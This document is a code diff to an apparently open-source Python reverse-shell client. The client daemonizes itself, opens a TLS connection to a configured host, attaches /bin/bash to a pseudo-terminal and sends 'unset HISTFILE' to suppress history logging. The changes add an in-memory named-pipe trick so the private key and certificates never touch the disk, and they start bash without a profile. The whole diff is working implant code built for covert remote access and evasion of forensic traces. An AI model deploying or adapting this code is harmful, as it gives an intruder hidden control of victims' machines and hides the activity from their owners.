@@ -27,13 +27,13 @@ along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
 HOST = "127.0.0.1"
 PORT = 443
-SHELL = "/bin/bash"
+SHELL = ["/bin/bash", "--noprofile"]
 FIRST_COMMAND = "unset HISTFILE"
 
 # openssl genrsa -out client.key 2048
-client_key = """-----BEGIN RSA PRIVATE KEY-----
+client_key = """-----BEGIN PRIVATE KEY-----
 [Edit me!]
------END RSA PRIVATE KEY-----"""
+-----END PRIVATE KEY-----"""
 
 # openssl req -new -key client.key -x509 -days 50 -out client.crt
 client_crt = """-----BEGIN CERTIFICATE-----
@@ -58,11 +58,12 @@ import ssl
 import subprocess
 import sys
 import tempfile
+import threading
+import time
 
 # -----------------------------------------------------------------------------
 
 GREEN = '\033[92m'
-ORANGE = '\033[93m'
 RED = '\033[91m'
 END = '\033[0m'
 
@@ -73,33 +74,62 @@ def success(text): return "[" + green("*") + "] " + green(text)
 
 # -----------------------------------------------------------------------------
 
+class PipeThread(threading.Thread):
+    """
+    This thread is a dirty hack to circumvent the SSL module's reliance on
+    files. The whole named pipe gymnastic is implemented to prevent writing
+    the key and certificates to the disk.
+    Named pipe contents are not backed to the hard drive but reside in memory.
+    """
+    def __init__(self, c_key_filename, c_crt_filename, s_crt_filename):
+        super(PipeThread, self).__init__()
+        self.c_key_filename = c_key_filename
+        self.c_crt_filename = c_crt_filename
+        self.s_crt_filename = s_crt_filename
+        self.ready = False
+
+    def run(self):
+        os.mkfifo(self.c_key_filename)
+        os.mkfifo(self.c_crt_filename)
+        os.mkfifo(self.s_crt_filename)
+        self.ready = True
+        with open(self.c_key_filename, "w") as pipe:
+            pipe.write(client_key)
+        with open(self.c_crt_filename, "w") as pipe:
+            pipe.write(client_crt)
+        with open(self.s_crt_filename, "w") as pipe:
+            pipe.write(server_crt)
+        return
+
+# -----------------------------------------------------------------------------
+
 def establish_connection():
     """
     This function establishes an SSL connection to the remote host.
     :return: A connected socket if the connection attempt was successful, or None.
     """
-    (c_key, c_crt, s_crt) = (tempfile.NamedTemporaryFile(), tempfile.NamedTemporaryFile(), tempfile.NamedTemporaryFile())
-    # I wish I didn't have to write the certs to disk, but the API leaves me no choice at all.
+    c_key = tempfile.mktemp()
+    c_crt = tempfile.mktemp()
+    s_crt = tempfile.mktemp()
+    t = PipeThread(c_key, c_crt, s_crt)
+    t.setDaemon(True)
+    t.start()
+    while not t.ready:
+        time.sleep(0.2)  # Make sure the thread has had time to create the pipes.
     try:
-        c_key.write(client_key)
-        c_key.flush()
-        c_crt.write(client_crt)
-        c_crt.flush()
-        s_crt.write(server_crt)
-        s_crt.flush()
         s = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), ssl_version=ssl.PROTOCOL_TLSv1,
-                            keyfile=c_key.name,
-                            certfile=c_crt.name,
-                            ca_certs=s_crt.name)
+                            keyfile=c_key,
+                            certfile=c_crt,
+                            ca_certs=s_crt)
         s.connect((HOST, PORT))
         return s
     except Exception as e:
         print error("Could not connect to %s:%d!%s (%s)" % (HOST, PORT, END, e))
         return None
     finally:
-        c_key.close()
-        c_crt.close()
-        s_crt.close()
+        os.unlink(c_key)
+        os.unlink(c_crt)
+        os.unlink(s_crt)
 
 # -----------------------------------------------------------------------------
 
@@ -132,12 +162,13 @@ def main():
     daemonize()
 
     master, slave = pty.openpty()
-    bash = subprocess.Popen([SHELL],
+    bash = subprocess.Popen(SHELL,
                             preexec_fn=os.setsid,
                             stdin=slave,
                             stdout=slave,
                             stderr=slave,
                             universal_newlines=True)
+    time.sleep(1)  # Wait for bash to start before sending data to it.
     os.write(master, "%s\n" % FIRST_COMMAND)
 
     try:
